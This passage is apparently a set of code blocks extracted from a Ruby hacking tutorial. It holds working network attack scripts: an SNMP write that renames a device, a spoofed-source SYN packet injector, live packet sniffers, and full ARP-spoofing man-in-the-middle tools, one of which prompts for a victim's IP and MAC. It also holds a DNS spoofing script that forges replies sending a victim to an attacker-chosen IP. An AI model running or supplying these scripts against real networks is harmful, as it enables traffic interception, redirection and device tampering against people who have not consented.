manager.get(\"sysName.0\").varbind_list[0]\ncontact  = manager.get(\"sysContact.0\").each_varbind.map {|vb| vb.value.to_s}    # manager.get(\"sysContact.0\").varbind_list[0]\nlocation = manager.get(\"sysLocation.0\").each_varbind.map {|vb| vb.value.to_s}   # manager.get(\"sysLocation.0\").varbind_list[0]\n\n# It would take an array of OIDs\nresponse = manager.get([\"sysName.0\", \"sysContact.0\", \"sysLocation.0\"])\nresponse.each_varbind do |vb|\n    puts vb.value.to_s\nend \n```", "```\nrequire 'snmp'\ninclude SNMP\n\n# Connect to SNMP server\nmanager = SNMP::Manager.new(:host => '192.168.0.17')\n# Config our request to OID\nvarbind = VarBind.new(\"1.3.6.1.2.1.1.5.0\", OctetString.new(\"Your System Got Hacked\"))\n# Send your request with varbind our settings\nmanager.set(varbind)\n# Check our changes\nmanager.get(\"sysName.0\").each_varbind.map {|vb| vb.value.to_s}\nmanager.close \n```", "```\napt-get -y install libpcap-dev \n```", "```\n    gem install packetfu pcaprub \n    ```", "```\nrequire 'packetfu'\n\nifconfig = PacketFu::Utils.ifconfig(\"wlan0\")\nifconfig[:iface]\nifconfig[:ip_saddr]\nifconfig[:eth_saddr] \n```", "```\nPacketFu::Utils.arp(\"192.168.0.21\", :iface => \"wlan0\") \n```", "```\nPacketFu::PcapFile.read_packets(\"file.pcap\") \n```", "```\nrequire 'packetfu'\n\ndef pkts\n  #$config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> \"wlan0\")).config     # set interface\n  $config = PacketFu::Config.new(:iface=> \"wlan0\").config   # use this line instead of above if you face `whoami?': uninitialized constant PacketFu::Capture (NameError)\n\n  #\n  #--> Build TCP/IP\n  #\n  #- Build Ethernet header:---------------------------------------\n  pkt = PacketFu::TCPPacket.new(:config => $config , :flavor => \"Linux\")    # IP header\n  #     pkt.eth_src = \"00:11:22:33:44:55\"        # Ether header: Source MAC ; you can use: pkt.eth_header.eth_src\n  #     pkt.eth_dst = \"FF:FF:FF:FF:FF:FF\"        # Ether header: Destination MAC ; you can use: pkt.eth_header.eth_dst\n  pkt.eth_proto                                  # Ether header: Protocol ; you can use: pkt.eth_header.eth_proto\n  #- Build IP header:---------------------------------------------\n  pkt.ip_v     = 4                     # IP header: IPv4 ; you can use: pkt.ip_header.ip_v\n  pkt.ip_hl    = 5                     # IP header: IP header length ; you can use: pkt.ip_header.ip_hl\n  pkt.ip_tos   = 0                     # IP header: Type of service ; you can use: pkt.ip_header.ip_tos\n  pkt.ip_len   = 20                    # IP header: Total Length ; you can use: pkt.ip_header.ip_len\n  pkt.ip_id                            # IP header: Identification ; you can use: pkt.ip_header.ip_id\n  pkt.ip_frag  = 0                     # IP header: Don't Fragment ; you can use: pkt.ip_header.ip_frag\n  pkt.ip_ttl   = 115                   # IP header: TTL(64) is the default ; you can use: pkt.ip_header.ip_ttl\n  pkt.ip_proto = 6                     # IP header: Protocol = tcp (6) ; you can use: pkt.ip_header.ip_proto\n  pkt.ip_sum                           # IP header: Header Checksum ; you can use: pkt.ip_header.ip_sum\n  pkt.ip_saddr = \"2.2.2.2\"             # IP header: Source IP. use $config[:ip_saddr] if you want your real IP ; you can use: pkt.ip_header.ip_saddr\n  pkt.ip_daddr = \"10.20.50.45\"         # IP header: Destination IP ; you can use: pkt.ip_header.ip_daddr\n  #- TCP header:-------------------------------------------------\n  pkt.payload        = \"Hacked!\"       # TCP header: packet header(body)\n  pkt.tcp_flags.ack  = 0               # TCP header: Acknowledgment\n  pkt.tcp_flags.fin  = 0               # TCP header: Finish\n  pkt.tcp_flags.psh  = 0               # TCP header: Push\n  pkt.tcp_flags.rst  = 0               # TCP header: Reset\n  pkt.tcp_flags.syn  = 1               # TCP header: Synchronize sequence numbers\n  pkt.tcp_flags.urg  = 0               # TCP header: Urgent pointer\n  pkt.tcp_ecn        = 0               # TCP header: ECHO\n  pkt.tcp_win        = 8192            # TCP header: Window\n  pkt.tcp_hlen       = 5               # TCP header: header length\n  pkt.tcp_src        = 5555            # TCP header: Source Port (random is the default )\n  pkt.tcp_dst        = 4444            # TCP header: Destination Port (make it random/range for general scanning)\n  pkt.recalc                           # Recalculate/re-build whole pkt (should be at the end)\n  #--> End of Build TCP/IP\n\n  pkt_to_a = [pkt.to_s]\n  return pkt_to_a\nend\n\ndef scan\n  pkt_array = pkts.sort_by{rand}\n  puts \"-\" * \" [-] Send Syn flag\".length + \"\\n\"  + \" [-] Send Syn flag \" + \"\\n\"\n\n  inj = PacketFu::Inject.new(:iface => $config[:iface] , :config => $config, :promisc => false)\n  inj.array_to_wire(:array => pkt_array)        # Send/Inject the packet through connection\n\n  puts \" [-] Done\" + \"\\n\" + \"-\" * \" [-] Send Syn flag\".length\nend\n\nscan \n```", "```\nrequire 'packetfu'\n\ncapture = PacketFu::Capture.new(:iface=> \"wlan0\", :promisc => true, :start => true)\ncapture.show_live \n```", "```\nrequire 'packetfu'\n\ncapture = PacketFu::Capture.new(:iface => \"wlan0\", :start => true, :filter => \"ip\")\nloop do\n  capture.stream.each do |pkt|\n    packet = PacketFu::Packet.parse(pkt)\n    puts \"#{Time.now}: \" + \"Source IP: #{packet.ip_saddr}\" + \" --> \" + \"Destination IP: #{packet.ip_daddr}\" if packet.payload =~ /hacked/i\n  end\nend \n```", "```\necho \"Hacked\" | nc -nv 192.168.0.15 4444 \n```", "```\n2015-03-04 23:20:38 +0300: Source IP: 192.168.0.13 --> Destination IP: 192.168.0.15 \n```", "```\n |Attacker|\n                 |\n                 \u0667\n|Victim| -----------------> |Router| ---> Internet \n```", "```\ninfo = PacketFu::Utils.whoami?(:iface => \"wlan0\") \n```", "```\n{:iface=>\"wlan0\",\n :pcapfile=>\"/tmp/out.pcap\",\n :eth_saddr=>\"3c:77:e6:68:66:e9\",\n :eth_src=>\"<w\\xE6hf\\xE9\",\n :ip_saddr=>\"192.168.0.13\",\n :ip_src=>3232235533,\n :ip_src_bin=>\"\\xC0\\xA8\\x00\\r\",\n :eth_dst=>\"\\x00P\\x7F\\xE6\\x96 \",\n :eth_daddr=>\"00:50:7f:e6:96:20\"} \n```", "```\n# Build Ethernet header\narp_packet_victim = PacketFu::ARPPacket.new\narp_packet_victim.eth_saddr = \"3C:77:E6:68:66:E9\"       # our MAC address\narp_packet_victim.eth_daddr = \"00:0C:29:38:1D:61\"       # the victim's MAC address\n# Build ARP Packet\narp_packet_victim.arp_saddr_mac = \"3C:77:E6:68:66:E9\"   # our MAC address\narp_packet_victim.arp_daddr_mac = \"00:0C:29:38:1D:61\"   # the victim's MAC address\narp_packet_victim.arp_saddr_ip = \"192.168.0.1\"          # the router's IP\narp_packet_victim.arp_daddr_ip = \"192.168.0.21\"         # the victim's IP\narp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply \n```", "```\n# Build Ethernet header\narp_packet_router = PacketFu::ARPPacket.new\narp_packet_router.eth_saddr = \"3C:77:E6:68:66:E9\"       # our MAC address\narp_packet_router.eth_daddr = \"00:0C:29:38:1D:61\"       # the router's MAC address\n# Build ARP Packet\narp_packet_router.arp_saddr_mac = \"3C:77:E6:68:66:E9\"   # our MAC address\narp_packet_router.arp_daddr_mac = \"00:50:7F:E6:96:20\"   # the router's MAC address\narp_packet_router.arp_saddr_ip = \"192.168.0.21\"         # the victim's IP\narp_packet_router.arp_daddr_ip = \"192.168.0.1\"          # the router's IP\narp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply \n```", "```\n# Send our packet through the wire\nwhile true\n    sleep 1\n    puts \"[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}\"\n    arp_packet_victim.to_w(info[:iface])\n    puts \"[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}\"\n    arp_packet_router.to_w(info[:iface])\nend \n```", "```\n#!/usr/bin/env ruby\n#\n# ARP Spoof Basic script\n#\nrequire 'packetfu'\n\nattacker_mac = \"3C:77:E6:68:66:E9\"\nvictim_ip    = \"192.168.0.21\"\nvictim_mac   = \"00:0C:29:38:1D:61\"\nrouter_ip    = \"192.168.0.1\"\nrouter_mac   = \"00:50:7F:E6:96:20\"\n\ninfo = PacketFu::Utils.whoami?(:iface => \"wlan0\")\n#\n# Victim\n#\n# Build Ethernet header\narp_packet_victim = PacketFu::ARPPacket.new\narp_packet_victim.eth_saddr = attacker_mac        # attacker MAC address\narp_packet_victim.eth_daddr = victim_mac          # the victim's MAC address\n# Build ARP Packet\narp_packet_victim.arp_saddr_mac = attacker_mac    # attacker MAC address\narp_packet_victim.arp_daddr_mac = victim_mac      # the victim's MAC address\narp_packet_victim.arp_saddr_ip = router_ip        # the router's IP\narp_packet_victim.arp_daddr_ip = victim_ip        # the victim's IP\narp_packet_victim.arp_opcode = 2                  # arp code 2 == ARP reply\n\n#\n# Router\n#\n# Build Ethernet header\narp_packet_router = PacketFu::ARPPacket.new\narp_packet_router.eth_saddr = attacker_mac        # attacker MAC address\narp_packet_router.eth_daddr = router_mac          # the router's MAC address\n# Build ARP Packet\narp_packet_router.arp_saddr_mac = attacker_mac    # attacker MAC address\narp_packet_router.arp_daddr_mac = router_mac      # the router's MAC address\narp_packet_router.arp_saddr_ip = victim_ip        # the victim's IP\narp_packet_router.arp_daddr_ip = router_ip        # the router's IP\narp_packet_router.arp_opcode = 2                  # arp code 2 == ARP reply\n\nwhile true\n    sleep 1\n    puts \"[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}\"\n    arp_packet_victim.to_w(info[:iface])\n    puts \"[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}\"\n    arp_packet_router.to_w(info[:iface])\nend \n```", "```\n[+] Sending ARP packet to victim: 192.168.0.21\n[+] Sending ARP packet to router: 192.168.0.1\n.\n.\n.\n[+] Sending ARP packet to victim: 192.168.0.21\n[+] Sending ARP packet to router: 192.168.0.1\n[+] Sending ARP packet to victim: 192.168.0.21\n[+] Sending ARP packet to router: 192.168.0.1 \n```", "```\n |Attacker|\n                    | AttackerSite\n                    \u0667                      AttackerSite\n|Victim| ----------/ \\----------> |Router| ----------> Internet\n          AnySite      AttackerSite \n```", "```\n0000   e7 1d 01 00 00 01 00 00 00 00 00 00 07 74 77 69\n0010   74 74 65 72 03 63 6f 6d 00 00 01 00 01 \n```", "```\n0000   07 74 77 69 74 74 65 72 03 63 6f 6d 00 00 01 00\n0010   01 \n```", "```\n#!/usr/bin/env ruby\n#\nrequire 'packetfu'\n\ninclude PacketFu\n\n#\n# * We need to start capturing/sniffing on specific interface\n# * We need to enable promiscuous mode on our interface\n# * We need to capture UDP packets on port 53 only\n#\nfilter = \"udp and port 53 and host \" + \"192.168.0.21\"\ncapture = Capture.new(:iface => \"wlan0\",:start => true, :promisc => true, :filter => filter, :save => true)\n\n# * We need to get the queried/requested domain\n#    * We need to know the domain length\n#    * We need to get the FQDN\n#\n# Convert DNS Payload to readable - Find The FQDN\n#\ndef readable(raw_domain)\n  # Prevent processing non domain\n  if raw_domain[0].ord == 0\n    puts \"ERROR : THE RAW STARTS WITH 0\"\n    return raw_domain[1..-1]\n  end\n\n  fqdn = \"\"\n  length_offset = raw_domain[0].ord\n  full_length   = raw_domain[ 0..length_offset ].length\n  domain_name   = raw_domain[(full_length - length_offset)..length_offset]\n\n  while length_offset != 0\n    fqdn << domain_name + \".\"\n    length_offset = raw_domain[full_length].ord\n    domain_name   = raw_domain[full_length + 1..full_length + length_offset]\n    full_length   = raw_domain[0..full_length + length_offset].length\n  end\n\n  return fqdn.chomp!('.')\nend\n\n# * We need parse/analyze the valid UDP packets only\n# * We need to make sure this packet is a DNS query\n#\n# Find the DNS packets\n#\ncapture.stream.each do |pkt|\n  # Make sure we can parse the packet; if we can, parse it\n  if UDPPacket.can_parse?(pkt)\n    @packet = Packet.parse(pkt)\n\n    # Make sure we have a query packet\n    dns_query = @packet.payload[2..3].to_s\n\n    if dns_query == \"\\x01\\x00\"\n      # Get the domain name into a readable format\n      domain_name = @packet.payload[12..-1].to_s # FULL QUERY\n      fqdn = readable(domain_name)\n\n      # Ignore non query packet\n      next if domain_name.nil?\n\n      puts \"DNS request for: \" + fqdn\n    end\n  end\nend \n```", "```\n spoofing_ip = \"69.171.234.21\"\nspoofing_ip.split('.').map {|octet| octet.to_i}.pack('c*')\n\n  response = UDPPacket.new(:config => PacketFu::Utils.ifconfig(\"wlan0\"))\n  response.udp_src   = packet.udp_dst\n  response.udp_dst   = packet.udp_src\n  response.ip_saddr  = packet.ip_daddr\n  response.ip_daddr  = \"192.168.0.21\"\n  response.eth_daddr = \"00:0C:29:38:1D:61\" \n```", "```\n#!/usr/bin/env ruby\n# -*- coding: binary -*-\n\n# Start the capture process\nrequire 'packetfu'\nrequire 'pp'\ninclude PacketFu\n\ndef readable(raw_domain)\n\n  # Prevent processing non domain\n  if raw_domain[0].ord == 0\n    puts \"ERROR : THE RAW STARTS WITH 0\"\n    return raw_domain[1..-1]\n  end\n\n  fqdn = \"\"\n  length_offset = raw_domain[0].ord\n  full_length   = raw_domain[ 0..length_offset ].length\n  domain_name   = raw_domain[(full_length - length_offset)..length_offset]\n\n  while length_offset != 0\n    fqdn << domain_name + \".\"\n    length_offset = raw_domain[full_length].ord\n    domain_name   = raw_domain[full_length + 1 .. full_length + length_offset]\n    full_length   = raw_domain[0 .. full_length + length_offset].length\n  end\n\n  return fqdn.chomp!('.')\nend\n\n#\n# Send Response\n#\ndef spoof_response(packet, domain)\n\n  attackerdomain_name = 'rubyfu.net'\n  attackerdomain_ip   = '54.243.253.221'.split('.').map {|oct| oct.to_i}.pack('c*')  # Spoofing IP\n\n  # Build UDP packet\n  response = UDPPacket.new(:config => PacketFu::Utils.ifconfig(\"wlan0\"))\n  response.udp_src   = packet.udp_dst             # source port\n  response.udp_dst   = packet.udp_src             # destination port\n  response.ip_saddr  = packet.ip_daddr            # modem's IP address to be source\n  response.ip_daddr  = packet.ip_saddr            # victim's IP address to be destination\n  response.eth_daddr = packet.eth_saddr           # the victim's MAC address\n  response.payload   = packet.payload[0,1]        # Transaction ID\n  response.payload  += \"\\x81\\x80\"                 # Flags: Reply code: No error (0)\n  response.payload  += \"\\x00\\x01\"                 # Question: 1\n  response.payload  += \"\\x00\\x00\"                 # Answer RRs: 0\n  response.payload  += \"\\x00\\x00\"                 # Authority RRs: 0\n  response.payload  += \"\\x00\\x00\"                 # Additional RRs: 0\n  response.payload  += attackerdomain_name.split('.').map do |section| # Queries | Name: , Convert domain to DNS style(the opposite of readable method)\n    [section.size.chr, section.chars.map {|c| '\\x%x' % c.ord}.join]\n  end.join + \"\\x00\"\n  response.payload  += \"\\x00\\x01\"                 # Queries | Type: A (Host address)\n  response.payload  += \"\\x00\\x01\"                 # Queries | Class: IN (0x0001)\n  response.payload  += \"\\xc0\\x0c\"                 # Answer | Name: twitter.com\n  response.payload  += \"\\x00\\x01\"                 # Answer | Type: A (Host address)\n  response.payload  += \"\\x00\\x01\"                 # Answer | Class: IN (0x0001)\n  response.payload  += \"\\x00\\x00\\x00\\x25\"         # Answer | Time to live: 37 seconds\n  response.payload  += \"\\x00\\x04\"                 # Answer | Data length: 4\n  response.payload  += attackerdomain_ip          # Answer | Addr\n  response.recalc                                 # Calculate the packet\n  response.to_w(response.iface)                   # Send the packet through our interface\nend\n\nfilter = \"udp and port 53 and host \" + \"192.168.0.21\"\n@capture = Capture.new(:iface => \"wlan0\", :start => true, :promisc => true, :filter => filter, :save => true)\n# Find the DNS packets\n@capture.stream.each do |pkt|\n  # Make sure we can parse the packet; if we can, parse it\n  if UDPPacket.can_parse?(pkt)\n    packet = Packet.parse(pkt)\n\n    # Get the offset of the query type: (request=\\x01\\x00, response=\\x81\\x80)\n    dns_query = packet.payload[2..3].to_s\n\n    # Make sure we have a dns query packet\n    if dns_query == \"\\x01\\x00\"\n      # Get the domain name into a readable format\n      domain_name = packet.payload[12..-1].to_s # FULL DOMAIN\n      fqdn = readable(domain_name)\n      # Ignore non query packet\n      next if domain_name.nil?\n      puts \"DNS request for: \" + fqdn\n\n    end\n    # Make sure we have a dns reply packet\n    if dns_query == \"\\x81\\x80\"\n      domain_name = packet.payload[12..-1].to_s # FULL DOMAIN\n      fqdn = readable(domain_name)\n      puts \"[*] Start Spoofing: \" + fqdn\n      spoof_response packet, domain_name\n    end\n\n  end\nend \n```", "```\nrequire 'packetfu'\nrequire 'socket'\n\ndef poison(lip, lmac, vip, vmac, rip, int_name)\n   puts \"Sending ARP Packet Spoof Every 29 Seconds\u2026\"\n   x = PacketFu::ARPPacket.new(:flavor => \"Linux\")\n     x.eth_saddr = lmac     # your MAC Address\n     x.eth_daddr = vmac     # victim MAC Address\n     x.arp_saddr_mac = lmac # your MAC Address\n     x.arp_daddr_mac = vmac # victim MAC Address\n     x.arp_saddr_ip = rip   # Router IP Address\n     x.arp_daddr_ip=  vip   # Victim IP Address\n     x.arp_opcode = 2       # ARP Reply Code\n   while true do \n     x.to_w(int_name)       # Put Packet to wire  interface\n      sleep(29)             # interval in seconds, change for your preference \n   end\nend\n\ndef get_ifconfig(int_name)\n    int_config = PacketFu::Utils.whoami?(:iface => int_name)\n    return int_config[:ip_saddr], int_config[:eth_saddr]\nend\n\ndef get_victim_info\n   puts \"enter victim ip\"\n   vip = gets\n   puts \"enter victim MAC\"\n   vmac = gets\n   puts \"enter gateway ip\"\n   rip = gets\n   return vip, vmac, rip\nend\n\n# need to be root to run this\nunless Process.uid.zero?\n  puts \"you need to run this script as root!\"\n  exit 0\nend\n\n# select interface to use and start setup\ninterfaces = Socket.getifaddrs.map { |i| i.name }.compact.uniq\nlist = Hash[(0...interfaces.size).zip interfaces]\nlist.each do |l, v|\n  puts \"#{l} #{v}\"\nend\n\nputs \"enter interface number to use on MITM\"\nint_number = gets\nif  list.key?(int_number.to_i)\n   lip, lmac = get_ifconfig(list.fetch(int_number.to_i))\n   vip, vmac, rip = get_victim_info()\n   poison(lip, lmac, vip, vmac, rip, list.fetch(int_number.to_i))\nelse\n  puts \"Selected interface does not exists\"\nend \n```"]